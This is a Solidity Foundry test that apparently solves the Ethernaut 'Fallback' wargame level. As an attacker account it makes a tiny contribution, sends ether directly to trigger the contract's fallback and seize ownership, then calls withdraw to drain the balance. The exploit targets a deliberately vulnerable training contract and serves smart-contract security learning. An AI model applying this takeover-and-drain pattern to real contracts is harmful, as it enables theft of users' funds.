// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

import "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

/// @title Exploit to the Fallback contract
/// @author @SeanEmile

contract FallbackTest is Test {
    Fallback public fallBack;
    address public owner;
    address public attacker;
    uint256 public mainnet;
    string public MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");

    function setUp() public {
        mainnet = vm.createFork(MAINNET_RPC_URL);
        vm.selectFork(mainnet);
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        startHoax(owner);
        fallBack = new Fallback{value: 1 ether}();
    }

    function testExploit() public noGasMetering {
        vm.stopPrank();
        startHoax(attacker);
        console.log(address(attacker).balance);
        fallBack.contribute{value: 1 wei}();
        (bool success,) = payable(address(fallBack)).call{value: 0.0001 ether}("");
        require(success, "failed to call to send ether");
        fallBack.withdraw();
        assertEq(address(fallBack).balance, 0, "contract should have no balance");
    }
}
